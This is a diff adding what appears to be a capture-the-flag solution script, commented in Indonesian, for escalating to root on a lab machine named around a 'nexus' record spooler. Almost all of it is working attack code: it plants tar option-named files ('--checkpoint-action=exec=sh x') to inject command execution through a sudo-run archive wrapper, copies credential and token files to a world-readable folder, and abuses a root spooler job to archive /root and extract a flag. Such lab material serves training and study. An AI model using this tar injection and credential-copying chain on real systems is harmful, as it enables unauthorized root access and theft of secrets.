@@ -1,0 +1,41 @@
+Eksploitasi: sudo (ops) + tar checkpoint injection + root spooler.
+
+# 1) Siapkan direktori dan script yang akan dieksekusi oleh tar (sebagai ops)
+mkdir -p /tmp/tarinj
+cd /tmp/tarinj
+cat > x <<'SH'
+#!/bin/sh
+# [REKONSTRUKSI] Aksi yang sama seperti dicatat di notes:
+# - copy /etc/nexus/ops.creds dan spool.token ke tempat world-readable
+# - tulis job spool untuk mengarsipkan /root
+# - copy hasil arsip ke /tmp/opsexfil
+mkdir -p /tmp/opsexfil
+cp /etc/nexus/ops.creds /tmp/opsexfil/ 2>/dev/null
+cp /etc/nexus/spool.token /tmp/opsexfil/ 2>/dev/null
+cat > /srv/record-spool/rootarc.job <<'JOB'
+id=rootarc
+action=archive
+target=/root
+JOB
+for i in $(seq 1 20); do
+  [ -f /var/backups/records/rootarc.tar.gz ] && break
+  sleep 1
+done
+cp /var/backups/records/rootarc.tar.gz /tmp/opsexfil/ 2>/dev/null
+chmod -R 777 /tmp/opsexfil
+SH
+chmod +x x
+
+# 2) File dengan nama opsi tar
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh x'
+
+# 3) Trigger wrapper sebagai ops
+sudo -n -u ops /usr/local/bin/record-archive /tmp/tarinj
+
+# 4) Root spooler (2 detik) membuat /var/backups/records/rootarc.tar.gz
+#    Script ops menyalinnya ke /tmp/opsexfil/.
+
+# 5) Ekstrak root.txt
+tar -xOzf /tmp/opsexfil/rootarc.tar.gz ./root.txt
+NFX{sp00l3r_4rch1v3_r00t_pwn3d}
